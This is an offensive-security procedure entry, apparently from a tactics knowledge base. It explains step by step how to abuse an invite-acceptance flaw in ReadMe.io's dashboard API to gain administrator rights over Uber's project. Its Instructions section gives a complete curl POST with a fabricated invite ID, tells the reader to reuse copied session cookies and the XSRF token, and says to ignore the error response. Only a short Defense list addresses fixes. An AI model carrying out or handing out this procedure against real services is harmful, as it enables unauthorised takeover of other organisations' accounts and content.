---
id: proc-bypass-invite
tags:
  - access-bypass
  - auth-bypass
  - invite-flaw
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/post-accept-nonexistent-invite]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:29:57.368Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Bypass-Invite-Validation-to-Gain-Admin-Access

## Summary

This procedure exploits a flaw in ReadMe.io's /api/accept-invite endpoint by sending a POST request with a fabricated non-existent invite ID, which unexpectedly grants administrator privileges to the targeted Uber project despite an error response.

## Description

The vulnerability stems from improper validation in the invite acceptance logic, where the endpoint associates the request with the project ID (extracted earlier) and elevates privileges without confirming invite existence. Use an authenticated session to craft the request. Target: dash.readme.io API. Expected outcome: Admin access to Uber's project, confirmed via dashboard.

## Requirements

1. Extracted project ID from prior reconnaissance
2. Authenticated ReadMe.io session with cookies and XSRF token
3. HTTP client like cURL

## Defense

Defensive measures and detection strategies:

- Validate invite existence before privilege grant
- Log and alert on mismatched invite/project associations
- Implement strict input validation on API endpoints

## Objectives

1. Circumvent access controls to gain elevated privileges
2. Associate attacker account with target project as admin
3. Enable documentation modifications for further exploitation

## Instructions

### Step 1: Prepare Request

**Context**: Gather session artifacts and construct the endpoint URL with a fake invite ID.

No command; preparation:

1. From browser DevTools, copy Cookie header and X-XSRF-TOKEN
2. Use a non-existent invite ID like 5617f98f7f74330d00dfd86d
3. Endpoint: https://dash.readme.io/api/accept-invite/{fake_id}

> Ensure headers mimic browser requests to avoid CSRF blocks.

### Step 2: Execute POST Request

**Context**: Send the request to trigger the bypass.

**Command** ([[commands/post-accept-nonexistent-invite]]):

```bash
curl -X POST 'https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d' \
  -H 'Host: dash.readme.io' \
  -H 'Connection: close' \
  -H 'Content-Length: 2' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Origin: https://dash.readme.io' \
  -H 'X-XSRF-TOKEN: <your_token>' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' \
  -H 'DNT: 1' \
  -H 'Referer: https://dash.readme.io/' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Accept-Language: en-GB,en-US;q=0.8,en;q=0.6' \
  -H 'Cookie: <your_cookies>' \
  -d '{}'
```

> Response: {'error': 'Invite doesn't exist'}. Ignore error; access dashboard to confirm admin role on Uber project.

### Step 3: Verify Access

**Context**: Confirm privilege escalation.

No command; browser:

1. Navigate to https://dash.readme.io
2. Go to Uber project users page

> Attacker account listed as admin; screenshot for evidence.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Lateral Movement]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/post-accept-nonexistent-invite]]

## Tools Used


## Tags

- [[access-bypass]]
- [[web]]

